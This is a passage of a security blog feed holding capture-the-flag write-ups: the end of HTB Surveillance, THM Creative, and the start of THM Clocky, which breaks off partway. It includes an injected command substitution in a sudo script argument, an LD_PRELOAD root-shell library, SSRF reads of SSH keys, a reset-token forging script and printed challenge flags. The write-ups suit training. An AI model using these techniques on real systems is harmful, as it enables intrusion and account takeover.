<p><img src="/images/HTB-Surveillance/user-flag.png" alt="user flag"></p>
<h3 id="port-forwarding">Port Forwarding</h3>
<p>Checking the services running on the target with <code>ss -lntp</code> we find something on port <code>8080</code>.</p>
<p><img src="/images/HTB-Surveillance/ss-cmd.png" alt="ss command"></p>
<p>We use port forwarding to access the service. On our local machine we run</p>
<pre tabindex="0"><code>ssh -f -N -L 5555:127.0.0.1:8080 matthew@surveillance.htb
</code></pre><blockquote>
<p>The command above establishes a tunnel from the local machine to the remote server <code>surveillance.htb</code>.</p>
</blockquote>
<p>We then access the service by visiting <code>localhost:5555</code>, and find a <code>ZoneMinder</code> instance.</p>
<blockquote>
<p>&ldquo;ZoneMinder is a free, open source Closed-circuit television software application developed for Linux which supports IP, USB and Analog cameras.&rdquo; Source - <a href="https://github.com/ZoneMinder/zoneminder" target="_blank" >ZoneMinder Github</a>

</p>
</blockquote>
<p><img src="/images/HTB-Surveillance/ZoneMinder.png" alt="ZoneMinder instance"></p>
<p>Searching <code>zoneminder exploit</code> we find a <a href="https://github.com/rvizx/CVE-2023-26035" target="_blank" >PoC</a>

 for <a href="https://www.exploit-db.com/exploits/51902" target="_blank" >CVE-2023-26035</a>

 which also leads to unauthenticated RCE.</p>
<pre tabindex="0"><code>git clone https://github.com/rvizx/CVE-2023-26035
cd CVE-2023-26035
python3 exploit.py -t &lt;target_url&gt; -ip &lt;attacker-ip&gt; -p &lt;port&gt;
</code></pre><p><img src="/images/HTB-Surveillance/ZM-exploit.png" alt="ZoneMinder RCE exploit"></p>
<p>On our listener we get another shell as <code>zoneminder</code>.</p>
<p><img src="/images/HTB-Surveillance/ZM-shell.png" alt="ZoneMinder RCE shell"></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>Running <code>sudo -l</code>, we learn that the user <code>zoneminder</code> can execute anything matching the pattern <code>/usr/bin/zm[a-zA-Z]*.pl</code> with <code>sudo</code> privileges without being prompted for a password. Moreover any options can be passed to the commands thanks to the wildcard <code>*</code>.</p>
<p><img src="/images/HTB-Surveillance/sudo-l.png" alt="sudo -l command"></p>
<p>Checking the content of <code>zmupdate.pl</code> we see that we can pass some arguments to it with switches like <code>--version</code> and <code>--user</code>.</p>
<p><img src="/images/HTB-Surveillance/zmupdate.png" alt="zmupdate script"></p>
<p>So we can potentially make it execute a file for us.</p>
<pre tabindex="0"><code>echo &#39;cp /bin/bash /tmp/bash;chmod 4755 /tmp/bash&#39; &gt; /tmp/exploit.sh
chmod +x /tmp/exploit.sh
</code></pre><blockquote>
<p>When the <code>exploit.sh</code> script will be executed, it will create a copy of the <code>bash</code> binary in <code>/tmp</code> and set its permissions to be executable with elevated privileges (setuid).</p>
</blockquote>
<p>With command substitution we execute our script via the <code>zmupdate.pl</code> script.</p>
<pre tabindex="0"><code>sudo /usr/bin/zmupdate.pl --version=1 --user=&#39;$(/tmp/exploit.sh)&#39;
</code></pre><blockquote>
<p>When the command is executed, anything enclosed within <code>$(...)</code> is treated as a command to be executed by the shell, and the output of that command replaces the command substitution. In this case, <code>/tmp/exploit.sh</code> is a script that creates a setuid binary for <code>/bin/bash</code> in the <code>/tmp</code> directory.</p>
</blockquote>
<p>After starting a new instance of the bash shell we get to root.</p>
<pre tabindex="0"><code>/tmp/bash -p
</code></pre><p><img src="/images/HTB-Surveillance/root-flag.png" alt="root flag"></p>
<p>This challenge was pretty straightforward and displayed how tunneling can be used for exploitation. If you want to dive deeper into tunneling Hack The Box has an excellent module on it available <a href="https://academy.hackthebox.com/module/details/158" target="_blank" >here</a>

. If you want to experiment with different tunneling tools you can check out <a href="https://github.com/anderspitman/awesome-tunneling" target="_blank" >awesome-tunneling</a>

.</p>
]]></content>
        </item>
        
        <item>
            <title>THM: Creative</title>
            <link>https://scorpiosec.com/posts/2024/04/thm-creative/</link>
            <pubDate>Wed, 17 Apr 2024 22:14:41 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/04/thm-creative/</guid>
            <description>Platform: TryHackMe Link: Creative Level: Easy OS: Linux The challenge begins with a static website that is unexploitable. Through subdomain enumeration, a URL testing application is uncovered, susceptible to SSRF. However, full exploitation is only possible after discovering an internally exposed port. This access allows for file reading on the server, leading to the retrieval of an SSH private key. Yet, this alone isn&amp;rsquo;t enough to establish a foothold. Success is achieved by cracking the obtained SSH key&amp;rsquo;s hash, granting access to the target system.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: TryHackMe</li>
<li>Link: <a href="https://tryhackme.com/r/room/creative" target="_blank" >Creative</a>

</li>
<li>Level: Easy</li>
<li>OS: Linux</li>
</ul>
<hr>
<p>The challenge begins with a static website that is unexploitable. Through subdomain enumeration, a URL testing application is uncovered, susceptible to SSRF. However, full exploitation is only possible after discovering an internally exposed port. This access allows for file reading on the server, leading to the retrieval of an SSH private key. Yet, this alone isn&rsquo;t enough to establish a foothold. Success is achieved by cracking the obtained SSH key&rsquo;s hash, granting access to the target system. Finally, privilege escalation is done by exploiting the <code>LD_PRELOAD</code> environment variable.</p>
<p>Target IP - <code>10.10.119.61</code></p>
<h2 id="scanning">Scanning</h2>
<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Creative 10.10.119.61
</code></pre><p><strong>Results</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-12 20:52 CDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.119.61
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.27s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://creative.thm
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 40.97 seconds
</span></span></code></pre></div><p>We have two ports open, 22 (SSH) and 80 (Nginx). We are redirected to <code>http://creative.thm</code>.</p>
<pre tabindex="0"><code>sudo echo &#34;10.10.119.61 creative.thm&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id="enumeration">Enumeration</h2>
<p>The website appears to be rather simple, without anything exploitable.</p>
<p>Directory enumeration and source code review do not yield anything.</p>
<p>Using ffuf for subdomain enumeration we find <code>beta</code>.</p>
<pre tabindex="0"><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --fc 404 -t 100 -u http://creative.thm -H &#34;Host: FUZZ.creative.thm&#34; -ic -fs 178
</code></pre><p><img src="/images/THM-Creative/beta-subdomain.png" alt="Beta subdomain found"></p>
<p>After adding it to the <code>/etc/hosts</code> file, we visit it and it turns out to be a URL tester.</p>
<p><img src="/images/THM-Creative/beta-url-tester.png" alt="URL tester website"></p>
<p>Submitting <code>http://127.0.0.1:80</code> brings back the content of the main page without the styling, hinting to SSRF.</p>
<p><img src="/images/THM-Creative/url-test.png" alt="URL tester SSRF 1"></p>
<p>Trying <code>http://creative.thm/etc/passwd</code> does not work. and returns <code>Dead</code>.</p>
<p><img src="/images/THM-Creative/file-read-fail.png" alt="File read attempt failed"></p>
<p>Let&rsquo;s try to discover the internal open ports on the target.</p>
<pre tabindex="0"><code>ffuf -u &#39;http://beta.creative.thm/&#39; -d &#34;url=http://127.0.0.1:FUZZ/&#34; -w &lt;(seq 1 65535) -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -mc all -t 100 -fs 13
</code></pre><p><img src="/images/THM-Creative/ffuf-cmd.png" alt="Internal ports fuzzing"></p>
<p>Port <code>1337</code> is discovered, by submitting <code>http://127.0.0.1:1337/</code> we are able to list the directories on the server.</p>
<p><img src="/images/THM-Creative/server-directories.png" alt="Directories on the server"></p>
<p>In Burp we explore the file system and see what we can find. Let&rsquo;s go to <code>/home</code>.</p>
<p><img src="/images/THM-Creative/home-dir.png" alt="Home directory via SSRF"></p>
<p>In <code>/home</code> we find a directory for <code>saad</code>. Going deeper with <code>http://127.0.0.1:1337/home/saad/</code> we discover the <code>.shh</code> folder and the user flag <code>user.txt</code>.</p>
<p>Using <code>http://127.0.0.1:1337/home/saad/user.txt</code> will reveal the flag.</p>
<h2 id="initial-foothold">Initial Foothold</h2>
<p>By submitting <code>http://127.0.0.1:1337/home/saad/.ssh/id_rsa</code> we can grab the SSH key of the user.</p>
<p><img src="/images/THM-Creative/saad-ssh-key.png" alt="saad user SSH key"></p>
<blockquote>
<p>Don&rsquo;t forget to set the correct permissions on the key with <code>chmod 600</code>.</p>
</blockquote>
<p>Attempting to log in via SSH fails because we still need the passphrase of the user.</p>
<pre tabindex="0"><code>ssh saad@creative.thm -i id_rsa
</code></pre><p><img src="/images/THM-Creative/ssh-fail.png" alt="SSH login failed"></p>
<p>We can use <code>john</code> to find the passphrase by converting the key into a crackable hash.</p>
<pre tabindex="0"><code>ssh2john id_rsa &gt; hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
</code></pre><p><img src="/images/THM-Creative/passphrase.png" alt="Hash cracking to recover passphrase"></p>
<p>The passphrase is found and we can now login.</p>
<p><img src="/images/THM-Creative/foothold.png" alt="Initial foothold via SSH login"></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>One of the things we should always check is the <code>.bash_history</code> file. It reveals the account password for <code>saad</code>.</p>
<p><img src="/images/THM-Creative/system-password.png" alt="Account password recovered"></p>
<p>With that password we are able to run <code>sudo -l</code>. The user is able to run <code>/usr/bin/ping</code> as root.</p>
<p><img src="/images/THM-Creative/sudo-l.png" alt="Sudo -l command"></p>
<p>There is not much we can do with <code>ping</code>. We could try to replace the binary with a malicious one if we had write permissions to <code>/usr/bin/</code> but that is not the case, all the files are owned by root.</p>
<p><img src="/images/THM-Creative/ping-binary.png" alt="Ping binary permissions"></p>
<p>Our next lead is the environment variable <code>LD_PRELOAD</code>.</p>
<blockquote>
<p>The <code>env_keep+=LD_PRELOAD</code> entry in the sudo configuration suggests that <code>saad</code> is allowed to preserve the <code>LD_PRELOAD</code> environment variable when running sudo commands. This could potentially be leveraged for loading malicious shared libraries.</p>
</blockquote>
<p><code>LD_PRELOAD</code> is an environment variable in Linux and other Unix-like operating systems. It allows a user to specify a list of additional shared libraries to preload before all others when a program is executed.</p>
<p>A great article about <code>Linux Privilege Escalation using LD_Preload</code> is available <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/" target="_blank" >here</a>

.</p>
<ol>
<li>We go to <code>/tmp</code> and create a <code>shell.c</code> file.</li>
</ol>
<pre tabindex="0"><code>cd /tmp
nano shell.c 
</code></pre><p>Here is the content of my file, I modified the one from the article because I was having issues during the compilation.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt; // Include this header for setuid() and setgid() functions</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">_init</span>() 
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unsetenv</span>(<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setgid</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setuid</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ol start="2">
<li>We compile and link <code>shell.c</code> into a shared library named <code>shell.so</code></li>
</ol>
<pre tabindex="0"><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles
</code></pre><p><img src="/images/THM-Creative/shared-library.png" alt="Shared library permissions"></p>
<ol start="3">
<li>Finally we execute the <code>ping</code> command with the <code>LD_PRELOAD</code> environment variable set to <code>/tmp/shell.so</code> and we get to root.</li>
</ol>
<pre tabindex="0"><code>sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
</code></pre><p><img src="/images/THM-Creative/root-flag.png" alt="Privilege escalation and root flag"></p>
<p>This was a pretty straightforward challenge, showing how one vulnerability can lead to an exploitation chain. The challenge also highlighted how misconfigurations can be used to an attacker&rsquo;s advantage. Until the next one, keep learning!</p>
]]></content>
        </item>
        
        <item>
            <title>THM: Clocky</title>
            <link>https://scorpiosec.com/posts/2024/04/thm-clocky/</link>
            <pubDate>Wed, 10 Apr 2024 13:03:18 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/04/thm-clocky/</guid>
            <description>Platform: TryHackMe Link: Clocky Level: Medium OS: Linux For this challenge our objective is to locate six flags. Our inital step involves examining the robots.txt file which contains some file extensions. By fuzzing with those file extensions we obtain an archive and extracting it yields the source code of an application. Upon reviewing the code we identify a way to manipulate the application&amp;rsquo;s password reset mechanism, granting us access to the administrative dashboard.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: TryHackMe</li>
<li>Link: <a href="https://tryhackme.com/r/room/clocky" target="_blank" >Clocky</a>

</li>
<li>Level: Medium</li>
<li>OS: Linux</li>
</ul>
<hr>
<p>For this challenge our objective is to locate six flags. Our inital step involves examining the <code>robots.txt</code> file which contains some file extensions. By fuzzing with those file extensions we obtain an archive and extracting it yields the source code of an application. Upon reviewing the code we identify a way to manipulate the application&rsquo;s password reset mechanism, granting us access to the administrative dashboard.</p>
<p>The dashboard presents a form vulnerable to Server-Side Request Forgery (SSRF), enabling us to acquire a file with plaintext passwords. By combining the user names we enumerate and the passwords, we get an initial foothold into the system via SSH.</p>
<p>Further exploration reveals a mysql database; however attempting to read one of its table&rsquo;s content produces some indecipherable output because of the <code>cache_sha2_password</code> plugin&rsquo;s encryption. Eventually, using a meticulously crafted query, we successfully dump the password hashes in a legible format and after cracking them we get the root password.</p>
<p>Target IP  - <code>10.10.62.39</code></p>
<h2 id="scanning">Scanning</h2>
<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Clocky 10.10.62.39
</code></pre><p><strong>Results</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-09 22:51 CDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.62.39
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.18s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> d9:42:e0:c0:d0:a9:8a:c3:82:65:ab:1e:5c:9c:0d:ef <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> ff:b6:27:d5:8f:80:2a:87:67:25:ef:93:a0:6b:5b:59 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> e1:2f:4a:f5:6d:f1:c4:bc:89:78:29:72:0c:ec:32:d2 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.41
</span></span><span style="display:flex;"><span>|_http-title: <span style="color:#ae81ff">403</span> Forbidden
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>8000/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">3</span> disallowed entries 
</span></span><span style="display:flex;"><span>|_/*.sql$ /*.zip$ /*.bak$
</span></span><span style="display:flex;"><span>|_http-title: <span style="color:#ae81ff">403</span> Forbidden
</span></span><span style="display:flex;"><span>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 55.02 seconds
</span></span></code></pre></div><p>We find three ports open 22 (SSH), 80 (HTTP - Apache) and 8000 (HTTP - Nginx). Both web servers seems to return a 403 status code.</p>
<h2 id="flag-1">Flag 1</h2>
<p>Both <code>http://10.10.62.39/</code> and <code>http://10.10.62.39:8000/</code> return <code>403 Fordbidden</code> as we could see in nmap.</p>
<p><img src="/images/THM-Clocky/Apache-403.png" alt="Apache 403 error"></p>
<p><img src="/images/THM-Clocky/Nginx-403.png" alt="Nginx 403 error"></p>
<p>From the nmap output we can see that the service on port 8000 has some disallowed entries for <code>robots.txt</code>. Visiting <code>http://10.10.62.39:8000/robots.txt</code>, we find a list of those same entries and flag 1.</p>
<p><img src="/images/THM-Clocky/flag1.png" alt="Clocky Flag 1"></p>
<pre tabindex="0"><code>THM{14b45bb9eefdb584b79063eca6a31b7a}
</code></pre><hr>
<h2 id="flag-2">Flag 2</h2>
<p>Directory enumeration on the first web server with gobuster is unfruitful, we switch to ffuf to fuzz for files.</p>
<p>We fuzz for all the extensions mentioned in <code>robots.txt</code>. Only <code>.zip</code> returns a result and we find <code>index</code>.</p>
<pre tabindex="0"><code>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -u http://10.10.62.39:8000/FUZZ.zip
</code></pre><p><img src="/images/THM-Clocky/ffuf-zip.png" alt="File fuzzing results"></p>
<p>We get a file called <code>index.zip</code> after going to <code>http://10.10.62.39:8000/index.zip</code> and extracting the archive gives us flag 2.</p>
<p><img src="/images/THM-Clocky/flag2.png" alt="Clocky Flag 2"></p>
<pre tabindex="0"><code>THM{1d3d62de34a3692518d03ec474159eaf}
</code></pre><hr>
<h2 id="flag-3">Flag 3</h2>
<p>The archive also contains a python file <code>app.py</code>, which appears to be the source code for a Flask application. At the end of the code we see that the app is running on port <code>8080</code>.</p>
<p><img src="/images/THM-Clocky/flask-app-8080.png" alt="Flask app on port 8080"></p>
<p>Navigating to <code>http://10.10.62.39:8080/</code> we get to a static website.</p>
<p><img src="/images/THM-Clocky/clocky-website.png" alt="Clocky website on port 8080"></p>
<p>In the source code we find multiple endpoints such as:</p>
<ul>
<li><code>/administrator</code> which has a login form.</li>
</ul>
<p><img src="/images/THM-Clocky/administrator.png" alt="Clocky administrator endpoint"></p>
<ul>
<li><code>/forgot_password</code> which allows to reset a password after the user provides a valid username.</li>
</ul>
<p><img src="/images/THM-Clocky/password-reset.png" alt="Clocky forgot_password endpoint"></p>
<ul>
<li><code>/password_reset</code>, this endpoint leads to a page with the message <code>Invalid Parameter</code>. In the code we see that we need to provide a token value.</li>
</ul>
<p><img src="/images/THM-Clocky/pwd_reset.png" alt="Clocky forgot_password endpoint"></p>
<p><img src="/images/THM-Clocky/token-expected.png" alt="Clocky token value expected"></p>
<p>Moreover the generation of the token is time sensitive. Here is how it works:</p>
<ul>
<li>once the application confirms that the user name provided exists in the database it gets the server&rsquo;s current date and time and stores it in <code>value</code>.</li>
<li><code>value</code> is then converted into a string and the last 4 characters are removed. A space, a dot and the upper case version of the user name are then appended to the string.</li>
<li>the <code>lnk</code> string is finally hashed using SHA-1 (which is insecure).</li>
</ul>
<p><img src="/images/THM-Clocky/token-gen-code.png" alt="Clocky token value expected"></p>
<p>So to exploit it we have to:</p>
<ul>
<li>provide a valid username</li>
<li>sync our date and time with the server&rsquo;s</li>
<li>generate a valid token value</li>
<li>reset the password of the adminstrator account</li>
</ul>
<p>We use the script below to achieve it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> datetime
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set the target URL, change the IP acordingly</span>
</span></span><span style="display:flex;"><span>base_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://10.10.62.39:8080/&#39;</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send a POST request to synchronize time</span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;administrator&#34;</span>}
</span></span><span style="display:flex;"><span>requests<span style="color:#f92672">.</span>post(base_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;forgot_password&#34;</span>, data<span style="color:#f92672">=</span>data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send a GET request to fetch the current time</span>
</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(base_url)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
</span></span><span style="display:flex;"><span>    time_pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;The current time is (\d</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-\d</span><span style="color:#e6db74">{2}</span><span style="color:#e6db74">-\d</span><span style="color:#e6db74">{2}</span><span style="color:#e6db74"> \d</span><span style="color:#e6db74">{2}</span><span style="color:#e6db74">:\d</span><span style="color:#e6db74">{2}</span><span style="color:#e6db74">:\d</span><span style="color:#e6db74">{2}</span><span style="color:#e6db74">)&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">match</span> <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(time_pattern, response<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">match</span>:
</span></span><span style="display:flex;"><span>        current_time_str <span style="color:#f92672">=</span> <span style="color:#66d9ef">match</span><span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Synchronized time:&#34;</span>, current_time_str)  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Generate and check valid tokens</span>
</span></span><span style="display:flex;"><span>        valid_tokens <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ms <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100</span>):
</span></span><span style="display:flex;"><span>            ms_str <span style="color:#f92672">=</span> str(ms)<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">2</span>)  
</span></span><span style="display:flex;"><span>            token_data <span style="color:#f92672">=</span> current_time_str <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.&#34;</span> <span style="color:#f92672">+</span> ms_str <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; . &#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;administrator&#34;</span><span style="color:#f92672">.</span>upper()
</span></span><span style="display:flex;"><span>            hashed_token <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1(token_data<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(base_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;password_reset&#39;</span>, params<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;token&#39;</span>: hashed_token})
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;&lt;h2&gt;Invalid token&lt;/h2&gt;&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Generated token: </span><span style="color:#e6db74">{</span>hashed_token<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>) 
</span></span><span style="display:flex;"><span>                valid_tokens<span style="color:#f92672">.</span>append(hashed_token)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Generated tokens:&#34;</span>, valid_tokens) 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Error: Could not parse server time from response.&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Error: Failed to fetch server response.&#34;</span>)
</span></span></code></pre></div><p>Go to <code>/forgot_password</code> and input administrator.</p>
<p><img src="/images/THM-Clocky/admin-reset.png" alt="administrator account reset"></p>
<p>After running the script we get a token value that we need to add to <code>/password_reset</code>.</p>
<p><img src="/images/THM-Clocky/clocky-py.png" alt="python script to generate valid token values"></p>
<pre tabindex="0"><code>10.10.62.39:8080/password_reset?token=2233b063a0ebf5505e2cf32a7fa79937d9b561ed
</code></pre><p>Our token value is correct and we are able to reset the password of the user <code>administrator</code>.</p>
<p><img src="/images/THM-Clocky/pwd-reset-success.png" alt="password reset success"></p>
<p>Going back to <code>/dashboard</code> we can login with <code>administrator:Password_you_picked</code> and we get the flag 3.</p>
<pre tabindex="0"><code>THM{ee68e42f755f6ebbcd89439432d7b462}
</code></pre><p><img src="/images/THM-Clocky/admin-dashboard.png" alt="admin dashboard"></p>
<hr>
<h2 id="flag-4">Flag 4</h2>
<p>On the Administrator Dashboard we can submit a <code>Location</code> and download a file. After capturing the request with Burp Suite we can see that it uses the <code>location</code> parameter.</p>
<p>It turns out to be vulnerable to SSRF.</p>
<blockquote>
